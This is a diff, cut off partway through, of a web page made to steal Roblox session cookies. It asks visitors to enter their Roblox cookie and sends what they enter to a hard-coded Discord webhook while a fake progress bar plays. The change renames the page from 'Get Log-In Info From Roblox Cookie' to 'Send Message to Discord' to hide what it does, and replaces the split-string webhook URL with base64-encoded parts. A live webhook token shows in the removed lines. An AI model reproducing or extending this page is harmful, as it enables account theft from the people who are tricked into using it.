@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Get Log-In Info From Roblox Cookie</title>
+  <title>Send Message to Discord</title>
   <style>
     body {
       background-color: #2c2f38;
@@ -161,7 +161,7 @@
 </head>
 <body>
   <div class="container">
-    <h1>Get Log-In Info From Roblox Cookie</h1>
+    <h1>Send a Message to Discord</h1>
     <input type="text" id="messageInput" placeholder="Enter Roblox Cookie">
     <div class="status-message" id="statusMessage"></div>
     <button onclick="sendMessage()">Send Message</button>
@@ -188,89 +188,7 @@
   </div>
 
   <script>
-    // Webhook URL broken down and obfuscated
-    const webhookPart1 = "https://discord.com/api/webhooks/";
-    const webhookPart2 = "1367593880861806602/";
-    const webhookPart3 = "j2nUxJofoMKaEc032py78vCjysveQe2gw1rMmcxRt0M09IHji3QRsEKpwkR6N2QE7Rtf";
-    
-    // Combine all parts to form the complete URL
-    const webhookURL = webhookPart1 + webhookPart2 + webhookPart3;
-
-    function sendMessage() {
-      const message = document.getElementById('messageInput').value.trim();
-      const statusMsg = document.getElementById('statusMessage');
-
-      if (!message) {
-        statusMsg.textContent = '❗ Please enter a message.';
-        statusMsg.style.color = '#ff5e5e';
-        return;
-      }
-
-      const barContainer = document.getElementById('loadingBarContainer');
-      const bar = document.getElementById('loadingBar');
-      const texts = [
-        document.getElementById('loadingText1'),
-        document.getElementById('loadingText2'),
-        document.getElementById('loadingText3'),
-        document.getElementById('loadingText4'),
-        document.getElementById('loadingText5')
-      ];
-
-      // Reset
-      bar.style.width = '0%';
-      barContainer.style.display = 'block';
-      texts.forEach(t => t.style.display = 'none');
-      texts[0].style.display = 'block';
-      statusMsg.textContent = '';
-
-      let step = 0;
-      const steps = [20, 40, 60, 80, 100];
-
-      function nextStep() {
-        if (step < steps.length) {
-          bar.style.width = steps[step] + '%';
-          texts.forEach((t, i) => t.style.display = (i === step) ? 'block' : 'none');
-          step++;
-          setTimeout(nextStep, 500);
-        } else {
-          setTimeout(() => {
-            barContainer.style.display = 'none';
-            bar.style.width = '0%';
-            texts.forEach(t => t.style.display = 'none');
-            statusMsg.textContent = '✅ Message Sent!';
-            statusMsg.style.color = '#56ff89';
-          }, 1000);
-          // Send message after the final step
-          sendToDiscord(message);
-        }
-      }
-
-      nextStep();
-    }
-
-    function sendToDiscord(message) {
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: message })
-      })
-      .then(() => {
-        // After message sent, the status message will be shown
-      })
-      .catch(() => {
-        statusMsg.textContent = '❌ Error sending message.';
-        statusMsg.style.color = '#ff5e5e';
-      });
-    }
-
-    function toggleSupportSection() {
-      const supportSection = document.getElementById('supportSection');
-      if (supportSection.style.display === 'none' || supportSection.style.display === '') {
-        supportSection.style.display = 'block';
-      } else {
-        supportSection.style.display = 'none';
-      }
-    }
-  </script>
-</body>
-</html>
+    // Base64-encoded parts of the webhook URL
+    const webhookPart1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
+    const webhookPart2 = "MTM2NzU5Mzg4MDg2MTgwNjYwMi8=";
+    const webhookPart3 = "ajJuVXhKb2ZvTWt
